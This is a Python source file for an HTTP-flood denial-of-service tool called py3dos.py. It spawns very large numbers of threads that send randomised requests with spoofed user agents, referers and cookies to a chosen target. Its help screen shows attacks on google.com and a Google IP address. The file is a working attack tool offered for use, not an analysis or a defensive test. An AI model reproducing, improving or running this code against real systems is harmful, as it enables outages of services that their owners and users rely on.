import time
from sys import argv
import urllib.request as urllibReq
from threading import Thread
from colorama import Fore
import colorama
import random

headers_referers = []
userAgents = []
colorama.init(autoreset=False)

user_agents_file = open('user-agents.txt','r')
header_ref_file = open('header-referers.txt','r')

for agent in user_agents_file:
    userAgents.append(agent.strip())

for header_ref in header_ref_file:
    headers_referers.append(header_ref.strip())

def helpScreen():
    print ('\nSimple DDoS Tool\n')
    print('Usage    : py3dos.py -u [url/IP] [flags]')
    print('Example  : py3dos.py -u https://google.com')
    print('Example  : py3dos.py -u http://172.217.194.100')
    print('\n')
    print('Flags\r')
    print('-u [url/IP] \t - Define Host/Target.')
    print('-A \t\t - Aggressive mode. Sets The Time Between Requests To A Low Value.')
    print('-t [int] \t - Define Number Of Threads. Accepts Only Integers. Default is 5000.')
    print('-l [int] \t - Define Number Of Request Loops To A Thread. Accept Only Integers. Default is 0 - Unlimited.')
    print('-e [int] \t - Maximum Number Of Errors To Exit A Thread. Accepts Only Integers. Default is 1000.')
    print('-nL \t\t - Referered to No Load. Send Request Without Any Parameters.')
    print('\t\t\tWith -nL Request Looks Like => http://hack.me/')
    print('\t\t\tWithout -nL Request Looks Like => http://hack.me/[some_random_string]')
    print('\n')
    print('More Examples\n')
    print('py3dos.py -u https://google.com')
    print('py3dos.py -u https://google.com -A')
    print('py3dos.py -u https://google.com -l 100 -t 7000')
    print('py3dos.py -u https://google.com -t 7000 -A -e 5000')
    print('py3dos.py -u https://google.com -A -nL \n')
    print('py3dos.py -u http://172.217.194.100')
    print('py3dos.py -u http://172.217.194.100 -A')
    print('py3dos.py -u http://172.217.194.100 -l 100 -t 7000')
    print('py3dos.py -u http://172.217.194.100 -t 7000 -A -e 5000')
    print('py3dos.py -u http://172.217.194.100 -A -nL')



class DOS(Thread):
    def __init__(self,url,type=1,limit=0,thresh=1000,aggressive=1):
        super(DOS,self).__init__()
        self.host = ''
        self.error = 0
        self.thresh = thresh
        self.url = url
        self.type = type
        self.limit = limit
        self.sleep = random.randint(1,5) if(aggressive == 1) else random.randint(10,20)
    
    def errorInc(self):
        self.error += 1

    def buildRand(self,size):
        finalStr = ""
        for i in range(size):
            finalStr += chr(random.randint(65,122))
        return finalStr
    
    def cookieGen(self,size):
        cookie = ""
        for i in range(size):
            for i in range(random.randint(2,10)):
                cookie += chr(random.randint(65,90))
            for i in range(random.randint(2,5)):
                cookie += str(random.randint(0,10))
            if((random.randint(0,10))%5 == 0):
                    cookie += '-'   
            for i in range(random.randint(2,10)):
                cookie += chr(random.randint(97,122))
        return cookie

    def httpReq(self,url):
        if url.count('?') > 0:
            self.paramJoiner = '&'
        else:
            self.paramJoiner = '?'

        self.payload = f'{url}{self.paramJoiner}{self.buildRand(random.randint(10,40))}={self.buildRand(random.randint(10,20))}' if self.type==1 else f'{self.url}'
        self.req = urllibReq.Request(self.payload)
        self.req.add_header('User-agent',random.choice(userAgents))
        self.req.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
        self.req.add_header('Cache-Control', 'no-cache')
        self.req.add_header('Accept-Encoding','gzip,deflate')
        self.req.add_header('Referer', random.choice(headers_referers) + self.buildRand(random.randint(60,200)))
        self.req.add_header('Keep-Alive', random.randint(2000,10000))
        self.req.add_header('connection', f'{"keep-alive" if(random.randint(0,20)%2 == 0) else "close"}')
        self.req.add_header('content-Type', 'application/x-www-form-urlencoded')
        self.req.add_header('set-cookie',f'SIDCC={self.cookieGen(random.randint(5,10))}; path=/; domain=.google.com; priority=high')
        self.req.add_header('Host',self.host)
        try:
            urllibReq.urlopen(self.req)
            print(Fore.GREEN + f'[+] Sending traffic to -> {url} \r')
        except:
            print(Fore.RED + f'[-] Target down ? \r')
            self.errorInc()
            
    def run(self):
        loop = 0 if(self.limit != 0) else -1
        while((self.error<self.thresh) and (loop<self.limit)):
            time.sleep(self.sleep)
            self.httpReq(self.url)
            if(self.limit!=0):loop+=1

        print(Fore.CYAN + "[!] Finished \r")


def main():
    if(len(argv)<=2 or (argv[-1] in ['-h','-H','-help','--help'])):
        helpScreen()


    elif(not('-u' in argv)):
        print(f'[-] Invalid command \r')
        print('Type py3dos.py -h  for more details.')
    
    else:
        target = argv[argv.index('-u')+1]
        if(('http') not in target):
            print(f'[-] Invalid command \r')
            print('Type py3dos.py -h  for more details.')
        else:
            try:
                noLoad = 0 if('-nL' in argv) else 1
                threads = int(argv[argv.index('-t')+1]) if('-t' in argv) else 700000
                loops = int(argv[argv.index('-l')+1]) if('-l' in argv) else 0
                errorThresh = int(argv[argv.index('-e')+1]) if('-e' in argv) else 1000
                aggressive = 1 if('-A' in argv) else 0

                print(Fore.CYAN + f"[!] Starting the attack on {target} \r")
                print(Fore.CYAN + f"[!] Threads : {threads} \r")
                if(loops != 0):print(Fore.CYAN + f"[!] Loops for 1 thread : {loops} \r")

                [DOS(f'{target}',noLoad,loops,errorThresh,aggressive).start() for i in range(threads)]
            except:
                print("Ooops! Something is not right :(")
                print('Type py3dos.py -h  for more details.')
                


if __name__ == "__main__":
    main()
